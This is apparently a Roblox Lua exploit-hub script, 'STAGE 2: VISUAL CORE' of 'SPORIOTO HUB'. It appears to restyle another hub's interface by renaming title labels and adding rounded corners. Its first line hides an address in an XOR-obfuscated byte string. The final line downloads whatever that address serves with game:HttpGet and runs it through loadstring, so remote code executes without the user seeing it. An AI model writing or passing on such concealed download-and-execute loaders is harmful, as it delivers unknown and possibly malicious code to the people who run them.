
--[[ STAGE 2: VISUAL CORE ]]
local Xr3zXJo1SzaOcZ0TUOOUhM="\035\019\015\015\006\057\066\062\251\000\238\235\240\241\228\221\025\226\210\204\010\193\204\182\250\237\175\182\227\216\165\167\213"local RVDmX3vMr4C7P=124 local Mbr53xcMh54rTyJS9xTDGM=237 local XRjKWO4JSqfXFp7PX_ke=1 local bi4i6VpVIG2S0hSOU=4 local C75LPkAGNpFQlZ02JD=6 local bnyjBBxRCBjubus2=false local S3Ac_CjoTgannX8WZ8Mx=bit32 and bit32.bxor if not S3Ac_CjoTgannX8WZ8Mx then S3Ac_CjoTgannX8WZ8Mx=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local w0pwMiW5RjJPKzZCj8UzX1={}for mNVGCNWE2JKnb9Xyv=1,#Xr3zXJo1SzaOcZ0TUOOUhM do local wYBvcYSYrTQGUQVD9wVk=string.byte(Xr3zXJo1SzaOcZ0TUOOUhM,mNVGCNWE2JKnb9Xyv)local MVyAEeoiYVlEGkuyK5=(Mbr53xcMh54rTyJS9xTDGM+(mNVGCNWE2JKnb9Xyv*bi4i6VpVIG2S0hSOU)+C75LPkAGNpFQlZ02JD)%256 if XRjKWO4JSqfXFp7PX_ke==0 then wYBvcYSYrTQGUQVD9wVk=(wYBvcYSYrTQGUQVD9wVk-MVyAEeoiYVlEGkuyK5)%256 w0pwMiW5RjJPKzZCj8UzX1[mNVGCNWE2JKnb9Xyv]=string.char(S3Ac_CjoTgannX8WZ8Mx(wYBvcYSYrTQGUQVD9wVk,RVDmX3vMr4C7P))else wYBvcYSYrTQGUQVD9wVk=S3Ac_CjoTgannX8WZ8Mx(wYBvcYSYrTQGUQVD9wVk,RVDmX3vMr4C7P)w0pwMiW5RjJPKzZCj8UzX1[mNVGCNWE2JKnb9Xyv]=string.char((wYBvcYSYrTQGUQVD9wVk-MVyAEeoiYVlEGkuyK5)%256)end end local XLNHlxb8j6zmwmr=table.concat(w0pwMiW5RjJPKzZCj8UzX1)if bnyjBBxRCBjubus2 then XLNHlxb8j6zmwmr=string.reverse(XLNHlxb8j6zmwmr)end local k9NJy6jco4_ZNSPN=XLNHlxb8j6zmwmr
local HubName = "SPORIOTO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(k9NJy6jco4_ZNSPN))()
